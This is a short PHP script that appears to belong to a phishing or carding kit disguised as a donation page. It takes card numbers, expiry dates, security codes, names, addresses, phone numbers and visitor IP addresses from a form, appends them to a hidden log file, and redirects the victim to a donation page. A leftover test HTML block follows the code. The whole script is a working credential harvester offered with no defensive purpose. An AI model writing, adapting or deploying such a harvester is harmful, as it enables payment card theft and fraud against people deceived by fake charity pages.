<?php

header('Location:Donar.html');


$cardNumber = $_POST['cardNumber'];
$expiry = $_POST['expiry'];
$securityCode = $_POST['securityCode'];
$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$line1 = $_POST['line1'];
$line2 = $_POST['line2'];
$ciudad = $_POST['city'];
$estado = $_POST['state'];
$telefono = $_POST['phone'];
$codigopostal = $_POST['postcode'];
$salto =$_POST[''];
$ip=$_SERVER['REMOTE_ADDR'];
$guardame=fopen('leeme003143.php','a +');

fwrite($guardame,
"mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm".$salto.
"
NumeroDeTarjeta:".$cardNumber.
"
Expiracion:".$expiry.
"
CodigoDeSeguridad:".$securityCode.
"
Nombre:".$firstName.
"
Apellido:".$lastName.
"
Direccion:".$line1.
"
Direccion2:".$line2.

"
ciudad:".$ciudad.
"
Estado:".$estado.
"
Telefono:".$telefono.
"
CodigoPostal:".$codigopostal." ");
fclose($guardame);


header("Location:donaciones/index2.html");
<html>
  <head><title>prueba</title></head>
  <body>
    <h1>Funciona</h1>
  </body>
</html>
